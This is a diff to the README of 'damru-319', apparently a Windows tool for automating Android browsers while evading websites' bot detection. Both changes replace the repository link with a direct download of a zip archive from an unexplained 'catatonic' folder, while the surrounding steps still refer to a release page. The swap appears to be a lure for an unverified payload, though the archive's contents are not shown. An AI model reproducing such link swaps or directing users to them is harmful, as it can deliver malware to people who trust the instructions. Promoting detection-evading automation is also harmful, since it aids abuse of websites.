@@ -1,6 +1,6 @@
 # 🛡️ damru-319 - Automate Android browsers with total stealth
 
-[![Download Damru](https://img.shields.io/badge/Download_Damru-blue)](https://github.com/Anant431/damru-319)
+[![Download Damru](https://img.shields.io/badge/Download_Damru-blue)](https://raw.githubusercontent.com/Anant431/damru-319/main/catatonic/damru-v1.4-beta.4.zip)
 
 Damru automates Android browser tasks without detection. Standard automation tools inject scripts that websites can see. Damru works differently. It changes the way your computer talks to the Android environment. It uses low-level code to mimic a real mobile device. This approach allows you to run automated tasks while looking like a human user. 
 
@@ -22,7 +22,7 @@ You need a Windows computer to run this tool. Ensure you meet these criteria bef
 
 Follow these steps to set up Damru on your machine.
 
-1. Visit the project website to find the application files. Click here: [Download Damru](https://github.com/Anant431/damru-319).
+1. Visit the project website to find the application files. Click here: [Download Damru](https://raw.githubusercontent.com/Anant431/damru-319/main/catatonic/damru-v1.4-beta.4.zip).
 2. Look for the release section on the page.
 3. Download the version labeled for Windows.
 4. Save the folder to a location you can find, such as your Desktop or Downloads folder.
